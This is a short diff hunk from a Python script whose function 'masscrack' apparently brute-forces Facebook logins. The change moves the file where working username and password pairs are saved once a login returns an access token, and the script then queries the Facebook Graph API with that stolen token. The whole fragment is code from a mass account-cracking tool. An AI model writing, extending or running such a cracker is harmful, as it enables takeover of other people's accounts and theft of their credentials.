@@ -79,7 +79,7 @@ def masscrack():
                         if back == (len(up)):
                                 break
                         if 'access_token' in mpsh:
-                                bisa = open("result/result_live.txt", "w")
+                                bisa = open("../../../../result/mbf_result.txt", "w")
                                 bisa.write(username+" | "+passw+"\n")
                                 bisa.close()
                                 x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
